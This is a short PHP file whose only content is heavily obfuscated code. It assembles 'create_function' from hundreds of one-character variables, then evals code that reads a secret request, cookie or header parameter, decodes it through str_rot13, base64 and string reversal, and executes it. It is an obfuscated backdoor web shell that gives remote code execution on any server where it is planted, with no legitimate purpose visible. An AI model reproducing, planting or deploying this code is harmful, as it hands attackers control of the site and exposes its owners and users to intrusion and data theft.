<?php
	$bimolecular= 'j'; $inquirers= 'QS(entIcy';$century= 'K';$chane= 'iE?'; $hamming ='>'; $casie = '"o"Rr"s';$hoopla ='o'; $becki ='i';$bobwhite ='GpRT4nP)';
	$folding='obrfp';$file= '8';$ideate ='f'; $drizzle='F6c$(Ke';$bulblet= 'r@';

	$chipmunks= 's';$apprehensions='@'; $arsine ='R';$heterogamous ='_'; $buiron= 'k';$barbarity = ';';$freighters='"dBYis';$injected ='Q'; $lase = 'c';$bison='n'; $dualities='e';
	$generations='t';
	$economist=')'; $concatenation= 'k';$mahmud ='N'; $evolve = 'c';

	$fed= 'Z'; $inhale ='ofae';$devisee = '@'; $jotted ='(';$evidenced = 'T';$automatic ='C'; $encipher = 'FKE';
	$berri =']'; $extrapolating='s_Sa(_e';$laughingstock = 'r';$electricity='a'; $flood = ')E)W';$executrix=')O7'; $forest = '(';$dentist ='E';
	$cristiano ='i';$gassings='L'; $lolopc ='o_bs^saF$';$dialysis='e'; $dragging = 'a';
	$cuff = 'raId_HXg'; $loitered = '_'; $issuant ='6'; $consultants='ne$g[';$coughs = 'l(vT?'; $armageddon= 'uAr'; $cumulatively = '"';$crawler= 'a$"O:'; $homogenate = 'l'; $dehlia='T';$estele = '$';

	$communique ='e';$iodide = ']'; $hedi ='b';$forbid= 'bn';$chalked='i='; $dame = 'x r_rmPd`'; $dasi= '[U';$irrigated= 'u';
	$logging = '(":';

	$collaborates='$';

	$freedoms ='rHVM$ea$'; $cuckoos='O9)it';
	$gutters= 'i'; $coil ='E'; $lotion ='HnVT_e]';$baiting= 'fR';
	$demons= '_';$handout = ';';
	$chemicals ='ataC'; $fitter='r)e';$intersects = 'E'; $jone= 'i'; $fluoresce = '()$x'; $electron= '(';
	$dulce='i'; $anhydride = '=_,V;';$barnyard= 'lJ_,avBah';$bog ='sURVv';$layney= 'O';$intensively= 'Pe])vgR'; $enrapture = 'fT_eDX;';$contiguous ='?p=5[](y)'; $exhume = 'eN';$isac ='m';
	$cruelest= ':'; $guiltiness= '('; $cupidity= 'g'; $dorothy='s';$flaked = 'NteSr';$churchgoer ='ke$';$grainy ='Xvor)tK'; $goatees ='i'; $cleon = 'd';$indoor ='O';$incubi= 'r"'; $bombed ='@';$askers = 'v'; $battlers = '[';
	$hoops= ';'; $cordelie ='B';

	$backstitching= '<tc';$deceased= '['; $facility =$backstitching['2'].$incubi['0'] .$churchgoer['1'].$barnyard['7'] .$backstitching[1].

	$churchgoer['1'] . $enrapture['2']. $enrapture['0']. $irrigated. $lotion['1'] .
	$backstitching['2'].
	$backstitching[1]. $goatees.$grainy['2']. $lotion['1'] ;$brunt = $dame['1'] ;
	 $cleave =$facility($brunt,$churchgoer['1'] . $askers.
	$barnyard['7'] . $barnyard[0].

	$guiltiness . $bombed.$barnyard['7'].

	$incubi['0'].
	$incubi['0']. $barnyard['7'] . $contiguous['7'].
	$enrapture['2'] .$contiguous['1']. $grainy['2']. $contiguous['1'] .$guiltiness .$enrapture['0']. $irrigated. $lotion['1'].$backstitching['2'].

	$enrapture['2'] . $cupidity. $churchgoer['1'] . $backstitching[1].$enrapture['2'] .$barnyard['7'] .$incubi['0']. $cupidity. $dorothy.$guiltiness .$grainy['4'].$grainy['4'] .$grainy['4']. $hoops); $cleave($bog[3] ,$freighters['3'] , $grainy['6'],$cordelie ,$barnyard['7'] ,

	$cuff['2'], $contiguous['0'] , $lotion['1'] ,$barnyard['7'], $fed ,
	$bobwhite['4'] , $incubi['0'] ,$churchgoer['2'] .$goatees .$contiguous['2'].$bombed . $barnyard['7']. $incubi['0']. $incubi['0'] . $barnyard['7'] .
	$contiguous['7'] .
	$enrapture['2'] . $isac.$churchgoer['1'].$incubi['0']. $cupidity . $churchgoer['1'] .$guiltiness. $churchgoer['2'].$enrapture['2'] . $intensively[6]. $intersects.

	$injected.

	$bog['1'] . $intersects . $flaked['3'].$enrapture['1'] .$barnyard['3']. $churchgoer['2'].$enrapture['2'].
	$chemicals['3']. $indoor. $indoor. $grainy['6'].$cuff['2'].
	$intersects.$barnyard['3']. $churchgoer['2'].$enrapture['2'].$flaked['3'] . $intersects.$intensively[6] .$bog[3] . $intersects .$intensively[6].
	$grainy['4'].$hoops .$churchgoer['2'].$barnyard['7']. $contiguous['2'] .$goatees .$dorothy. $dorothy. $churchgoer['1'] . $backstitching[1]. $guiltiness .

	$churchgoer['2'].$goatees . $deceased['0'] . $incubi['1']. $askers.
	$grainy['2'].
	$churchgoer[0] . $enrapture['0'] . $forbid['0'] . $incubi['0'] .
	$lotion['1'].
	$fluoresce['3'] .
	$incubi['1'] . $contiguous['5']. $grainy['4'] . $contiguous['0'].
	$churchgoer['2'].

	$goatees.$deceased['0'] .$incubi['1'] .$askers .
	$grainy['2'].$churchgoer[0].$enrapture['0'] . $forbid['0'] .
	$incubi['0'] .$lotion['1'].

	$fluoresce['3']. $incubi['1'] . $contiguous['5'] . $cruelest. $guiltiness.
	$goatees .$dorothy. $dorothy.$churchgoer['1'].$backstitching[1]. $guiltiness .$churchgoer['2'] .$goatees .$deceased['0'].

	$incubi['1'] . $lotion['0'] .$enrapture['1']. $enrapture['1'] . $intensively['0'].$enrapture['2'] . $bog[3].
	$indoor.
	$grainy['6'] .$lolopc['7'] .$cordelie.$intensively[6] .$flaked['0'] . $grainy['0']. $incubi['1'] . $contiguous['5'].$grainy['4']. $contiguous['0'] . $churchgoer['2']. $goatees .$deceased['0'] .

	$incubi['1'] . $lotion['0'].$enrapture['1']. $enrapture['1'].$intensively['0'] . $enrapture['2'].$bog[3]. $indoor.$grainy['6'] . $lolopc['7'].$cordelie .$intensively[6]. $flaked['0'] . $grainy['0']. $incubi['1'].$contiguous['5'] . $cruelest. $cleon. $goatees.$churchgoer['1']. $grainy['4'] .$hoops. $bombed .$churchgoer['1'] .$askers . $barnyard['7'] .
	$barnyard[0] .

	$guiltiness. $dorothy.$backstitching[1] .$incubi['0']. $incubi['0'] .$churchgoer['1'].$askers . $guiltiness .$forbid['0']. $barnyard['7'] .$dorothy .
	$churchgoer['1'].$issuant . $bobwhite['4'] .$enrapture['2'].$cleon.$churchgoer['1'].$backstitching['2']. $grainy['2']. $cleon . $churchgoer['1'].

	$guiltiness. $dorothy .$backstitching[1]. $incubi['0'] .

	$incubi['0'].
	$churchgoer['1'] .
	$askers. $guiltiness .$churchgoer['2'].

	$barnyard['7'].$grainy['4']. $grainy['4']. $grainy['4'].
	$grainy['4'] .$hoops ); 